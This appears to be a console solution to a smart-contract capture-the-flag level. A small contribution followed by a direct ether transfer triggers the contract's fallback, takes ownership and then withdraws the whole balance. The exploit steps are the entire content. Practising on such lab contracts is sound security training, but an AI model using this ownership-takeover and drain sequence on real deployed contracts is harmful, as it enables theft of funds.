```javascript
await contract.owner()
'0x....'  // Level address
await contract.getContribution()
// {.., words: (2) [0, empty], ..}
await contract.contribute({value: toWei('0.0001')})
await sendTransaction({from: player, to: contract.address, value: toWei('0.0001')})
await contract.owner()
'0x....'  // My address

await getBalance(contract.address)
'0.00012'
await contract.withdraw()
await getBalance(contract.address)
'0'
```